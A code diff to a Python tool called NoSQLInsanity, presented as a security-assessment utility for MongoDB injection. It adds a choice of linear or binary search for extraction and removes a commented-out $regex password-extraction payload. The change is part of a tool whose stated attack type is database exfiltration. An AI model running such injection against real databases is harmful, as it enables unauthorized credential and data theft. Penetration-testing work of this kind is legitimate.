@@ -21,6 +21,7 @@ class NoSQLInsanity(object):
       self.url = url
       self.platform = platform
       self.reqMethod = ""
+      self.alg = ""
       self.attackType = ""
       self.arrAttackTypes = ["DB Attacks (Exfiltrate)"]
       self.typeParam = ""
@@ -66,14 +67,6 @@ class NoSQLInsanity(object):
       banner = """\n================\nTarget      : %s\nPlatform    : %s\n%s """ % (self.url, self.platform, attackType)
       return banner
 
-    # def request(self):
-    #   payload='{"username": {"$eq": "%s"}, "password": {"$regex": "^%s" }}' % (username, password + c)
-    #   # payload = '{"username": {"$eq": "admin"}, "password": {"$regex": "^2" }})'
-    #   headers = {
-    #     'Content-Type': 'application/json'
-    #   }
-    #   r = requests.request("POST", url, headers=headers, data=payload, verify = False)
-
 if __name__ == "__main__":
   parser = argparse.ArgumentParser(description='NoSQLInsanity: Tool for Security Assesment NSQL')
   parser.add_argument('--url', type=str, required=True)
@@ -94,14 +87,21 @@ if __name__ == "__main__":
         choosedParam = nsimongo.paramMenu(nsi)
         # print('ok' + '\n'.join(map(str, nsi.params)))
         nsimongo.typeReqPayload(nsi)
+        alg = nsimongo.algMenu(nsi)
         resArr = nsimongo.vulnTest(nsi=nsi)
         
         for item in resArr:
             if True in item.values():
-                print("True exists in the array" + str(item))
-                break
+              # print("True exists in the array" + str(item))
+              print("Injecting .. ")
+              break
         else:
           print("True does not exist in the array")
+        
+        if (alg == '1'):
+          nsimongo.slinear(nsi)
+        else:
+          nsimongo.sbin(nsi)
         # params = nsimongo.requestBuilder(nsi=nsi, isExploiting=True)
         # nsimongo.pwnGet(url, params)
         break
@@ -111,11 +111,8 @@ if __name__ == "__main__":
       while case.default:
         print('Choosen number invalid !')
         break
-    # nsi.chooseMethodMenu(choosedMenu)
-    # nsi.chooseMethodMenu()
 
 
-  # nsi.request()
-  #refs: 
-  # https://github.com/eversinc33/Papaya/blob/875a1585f8f0776963c8b004597e7290b530b11c/papaya.py#L121
-  # https://github.com/Hex27/mongomap/tree/d16cee2e0b2b2af3c3a34e4f1a21f66cc7dacafe/tests
+#refs: 
+# https://github.com/eversinc33/Papaya/blob/875a1585f8f0776963c8b004597e7290b530b11c/papaya.py#L121
+# https://github.com/Hex27/mongomap/tree/d16cee2e0b2b2af3c3a34e4f1a21f66cc7dacafe/tests
